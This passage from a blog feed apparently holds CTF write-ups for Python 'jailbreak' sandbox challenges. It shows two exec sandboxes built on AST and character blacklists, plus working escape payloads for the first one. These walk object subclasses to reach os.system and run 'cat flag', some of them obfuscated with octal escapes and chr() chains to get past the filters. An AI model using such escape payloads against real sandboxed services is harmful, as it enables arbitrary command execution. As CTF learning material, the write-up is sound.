FROM python:3.12.3-alpine</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line">BANNER = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">          .?77777777777777$.            </span></span><br><span class="line"><span class="string">          777..777777777777$+           </span></span><br><span class="line"><span class="string">         .77    7777777777$$$           </span></span><br><span class="line"><span class="string">         .777 .7777777777$$$$           </span></span><br><span class="line"><span class="string">         .7777777777777$$$$$$           </span></span><br><span class="line"><span class="string">         ..........:77$$$$$$$           </span></span><br><span class="line"><span class="string">  .77777777777777777$$$$$$$$$.=======.  </span></span><br><span class="line"><span class="string"> 777777777777777777$$$$$$$$$$.========  </span></span><br><span class="line"><span class="string">7777777777777777$$$$$$$$$$$$$.========= </span></span><br><span class="line"><span class="string">77777777777777$$$$$$$$$$$$$$$.========= </span></span><br><span class="line"><span class="string">777777777777$$$$$$$$$$$$$$$$ :========+.</span></span><br><span class="line"><span class="string">77777777777$$$$$$$$$$$$$$+..=========++~</span></span><br><span class="line"><span class="string">777777777$$..~=====================+++++</span></span><br><span class="line"><span class="string">77777777$~.~~~~=~=================+++++.</span></span><br><span class="line"><span class="string">777777$$$.~~~===================+++++++.</span></span><br><span class="line"><span class="string">77777$$$$.~~==================++++++++: </span></span><br><span class="line"><span class="string"> 7$$$$$$$.==================++++++++++. </span></span><br><span class="line"><span class="string"> .,$$$$$$.================++++++++++~.  </span></span><br><span class="line"><span class="string">         .=========~.........           </span></span><br><span class="line"><span class="string">         .=============++++++           </span></span><br><span class="line"><span class="string">         .===========+++..+++           </span></span><br><span class="line"><span class="string">         .==========+++.  .++           </span></span><br><span class="line"><span class="string">          ,=======++++++,,++,           </span></span><br><span class="line"><span class="string">          ..=====+++++++++=.            </span></span><br><span class="line"><span class="string">                ..~+=...     </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> Filter out more dangerous operations</span></span><br><span class="line">FORBIDDEN_AST = [</span><br><span class="line">    ast.Import,</span><br><span class="line">    ast.ImportFrom,</span><br><span class="line">    ast.ClassDef,</span><br><span class="line">    ast.Assign,</span><br><span class="line">    ast.Eq,</span><br><span class="line">]</span><br><span class="line">FORBIDDEN_PATTERNS = [<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(c) &gt; <span class="number">1000</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Code too long&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> FORBIDDEN_PATTERNS:</span><br><span class="line">        <span class="keyword">if</span> ch <span class="keyword">in</span> c:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Forbidden character found&#x27;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        c = ast.parse(c, <span class="string">&#x27;&lt;CNSS&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Syntax error&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ast.walk(c):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(i) <span class="keyword">in</span> FORBIDDEN_AST:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Forbidden operation found&#x27;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(BANNER)</span><br><span class="line">code = <span class="built_in">input</span>(<span class="string">&#x27;Enter base64 encoded code: &#x27;</span>)</span><br><span class="line">code = base64.b64decode(code.strip()).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">check(code)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    code = <span class="built_in">compile</span>(code, <span class="string">&#x27;&lt;CNSS&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">    <span class="built_in">exec</span>(code, &#123;<span class="string">&#x27;__builtins__&#x27;</span>: &#123;&#125;&#125;)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p><code>ast.Eq</code><code>==</code>ban<br /><code>&quot; ' __ [ ] class global import system</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> ().__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;_wrap_close&quot;</span> <span class="keyword">in</span> x.__name__ ][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">x<span class="built_in">str</span>(\<span class="number">137</span>\<span class="number">137</span>\<span class="number">151</span>\<span class="number">156</span>\<span class="number">151</span>\<span class="number">164</span>\<span class="number">137</span>\<span class="number">137</span>)<span class="built_in">str</span>(\<span class="number">137</span>\<span class="number">137</span>\<span class="number">147</span>\<span class="number">154</span>\<span class="number">157</span>\<span class="number">142</span>\<span class="number">141</span>\<span class="number">154</span>\<span class="number">163</span>\<span class="number">137</span>\<span class="number">137</span>) <span class="keyword">for</span> x <span class="keyword">in</span> ()<span class="built_in">str</span>(\<span class="number">137</span>\<span class="number">137</span>\<span class="number">143</span>\<span class="number">154</span>\<span class="number">141</span>\<span class="number">163</span>\<span class="number">163</span>\<span class="number">137</span>\<span class="number">137</span>)<span class="built_in">str</span>(\<span class="number">137</span>\<span class="number">137</span>\<span class="number">142</span>\<span class="number">141</span>\<span class="number">163</span>\<span class="number">145</span>\<span class="number">137</span>\<span class="number">137</span>)<span class="built_in">str</span>(\<span class="number">137</span>\<span class="number">137</span>\<span class="number">163</span>\<span class="number">165</span>\<span class="number">142</span>\<span class="number">143</span>\<span class="number">154</span>\<span class="number">141</span>\<span class="number">163</span>\<span class="number">163</span>\<span class="number">145</span>\<span class="number">163</span>\<span class="number">137</span>\<span class="number">137</span>)() <span class="keyword">if</span> <span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">119</span>)+<span class="built_in">chr</span>(<span class="number">114</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">112</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">99</span>)<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">111</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">101</span>) <span class="keyword">in</span> x<span class="built_in">str</span>(\<span class="number">137</span>\<span class="number">137</span>\<span class="number">156</span>\<span class="number">141</span>\<span class="number">155</span>\<span class="number">145</span>\<span class="number">137</span>\<span class="number">137</span>)pop(<span class="number">0</span>)(<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">121</span>)<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">116</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">109</span>))(<span class="built_in">chr</span>(<span class="number">99</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">116</span>)+<span class="built_in">chr</span>(<span class="number">32</span>)+<span class="built_in">chr</span>(<span class="number">102</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">103</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[x[<span class="string">&quot;\137\137\151\156\151\164\137\137&quot;</span>][<span class="string">&quot;\137\137\147\154\157\142\141\154\163\137\137&quot;</span>] <span class="keyword">for</span> x <span class="keyword">in</span> ()[<span class="string">&quot;\137\137\143\154\141\163\163\137\137&quot;</span>][<span class="string">&quot;\137\137\142\141\163\145\137\137&quot;</span>][<span class="string">&quot;\137\137\163\165\142\143\154\141\163\163\145\163\137\137&quot;</span>]() <span class="keyword">if</span> <span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">119</span>)+<span class="built_in">chr</span>(<span class="number">114</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">112</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">99</span>)<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">111</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">101</span>) <span class="keyword">in</span> x[<span class="string">&quot;\137\137\156\141\155\145\137\137&quot;</span>]]pop(<span class="number">0</span>)(<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">121</span>)<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">116</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">109</span>))(<span class="built_in">chr</span>(<span class="number">99</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">116</span>)+<span class="built_in">chr</span>(<span class="number">32</span>)+<span class="built_in">chr</span>(<span class="number">102</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">103</span>))</span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/12303">https://xz.aliyun.com/t/12303</a><br /><a href="https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">https://www.tr0y.wang/2019/05/06/Python/</a><br /><a href="https://lazzzaro.github.io/2020/05/15/web-SSTI/">https://lazzzaro.github.io/2020/05/15/web-SSTI/</a><br /><a href="https://www.cnblogs.com/mumuhhh/p/17811377.html">https://www.cnblogs.com/mumuhhh/p/17811377.html</a><br /><a href="https://xz.aliyun.com/t/12647">https://xz.aliyun.com/t/12647</a><br />++</p><h2 id="-jailbreak-again-and-again"><a class="markdownIt-Anchor" href="#-jailbreak-again-and-again"></a>  jailbreak-again-and-again()</h2><p><code>nc 156.238.233.117 47802</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># FROM python:3.12.3-alpine</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line">BANNER = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">          .?77777777777777$.            </span></span><br><span class="line"><span class="string">          777..777777777777$+           </span></span><br><span class="line"><span class="string">         .77    7777777777$$$           </span></span><br><span class="line"><span class="string">         .777 .7777777777$$$$           </span></span><br><span class="line"><span class="string">         .7777777777777$$$$$$           </span></span><br><span class="line"><span class="string">         ..........:77$$$$$$$           </span></span><br><span class="line"><span class="string">  .77777777777777777$$$$$$$$$.=======.  </span></span><br><span class="line"><span class="string"> 777777777777777777$$$$$$$$$$.========  </span></span><br><span class="line"><span class="string">7777777777777777$$$$$$$$$$$$$.========= </span></span><br><span class="line"><span class="string">77777777777777$$$$$$$$$$$$$$$.========= </span></span><br><span class="line"><span class="string">777777777777$$$$$$$$$$$$$$$$ :========+.</span></span><br><span class="line"><span class="string">77777777777$$$$$$$$$$$$$$+..=========++~</span></span><br><span class="line"><span class="string">777777777$$..~=====================+++++</span></span><br><span class="line"><span class="string">77777777$~.~~~~=~=================+++++.</span></span><br><span class="line"><span class="string">777777$$$.~~~===================+++++++.</span></span><br><span class="line"><span class="string">77777$$$$.~~==================++++++++: </span></span><br><span class="line"><span class="string"> 7$$$$$$$.==================++++++++++. </span></span><br><span class="line"><span class="string"> .,$$$$$$.================++++++++++~.  </span></span><br><span class="line"><span class="string">         .=========~.........           </span></span><br><span class="line"><span class="string">         .=============++++++           </span></span><br><span class="line"><span class="string">         .===========+++..+++           </span></span><br><span class="line"><span class="string">         .==========+++.  .++           </span></span><br><span class="line"><span class="string">          ,=======++++++,,++,           </span></span><br><span class="line"><span class="string">          ..=====+++++++++=.            </span></span><br><span class="line"><span class="string">                ..~+=...     </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># Enough ?</span></span><br><span class="line">FORBIDDEN_AST = [</span><br><span class="line">    ast.Import,</span><br><span class="line">    ast.ImportFrom,</span><br><span class="line">    ast.ClassDef,</span><br><span class="line">    ast.FunctionDef,</span><br><span class="line">    ast.Assign,</span><br><span class="line">    ast.Eq,</span><br><span class="line">    ast.Add,</span><br><span class="line">    ast.Mult,</span><br><span class="line">    ast.Mod,</span><br><span class="line">    ast.Assert,</span><br><span class="line">    ast.Compare,</span><br><span class="line">    ast.AugAssign,</span><br><span class="line">    ast.AnnAssign,</span><br><span class="line">    ast.Call,</span><br><span class="line">]</span><br><span class="line">FORBIDDEN_PATTERNS = [<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;class&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(c) &gt; <span class="number">0x100</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Code too long&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> FORBIDDEN_PATTERNS:</span><br><span class="line">        <span class="keyword">if</span> ch <span class="keyword">in</span> c:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Forbidden pattern found&#x27;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        code.encode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Invalid encoding&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        c = ast.parse(c, <span class="string">&#x27;&lt;CNSS&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Syntax error&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ast.walk(c):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(i) <span class="keyword">in</span> FORBIDDEN_AST:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Forbidden operation found&#x27;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(BANNER)</span><br><span class="line">code = <span class="built_in">input</span>(<span class="string">&#x27;Enter base64 encoded code: &#x27;</span>)</span><br><span class="line">code = base64.b64decode(code.strip()).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">check(code)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    code = <span class="built_in">compile</span>(code, <span class="string">&#x27;&lt;CNSS&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">    <span class="built_in">exec</span>(code, &#123;<span class="string">&#x27;__builtins__&#x27;</span>: &#123;&#125;&#125;)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>++</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#web&quot;&gt;&lt;/a&gt; Web&lt;/h1&gt;
&lt;h2 id=&quot;babyhttp&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#babyhttp&quot;&gt;&lt;/a&gt;  </summary>
      
    
    
    
    
  </entry>
  
</feed>
